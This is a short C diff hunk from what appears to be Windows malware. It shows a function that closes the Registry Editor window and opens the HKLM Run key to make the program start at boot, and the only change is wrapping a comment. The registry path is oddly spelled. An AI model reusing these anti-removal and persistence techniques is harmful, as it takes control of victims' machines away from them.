@@ -52,7 +52,7 @@ DWORD WINAPI DestroyWindows(LPVOID) {
         PostMessage(Regedit, WM_CLOSE, (LPARAM) 0, (WPARAM) 0);
       }
 
-      Add your program to run when windows starts
+      /*Add your program to run when windows starts*/
 
       HKEY hKey;
       RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Mcft\\W indows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, & hKey);
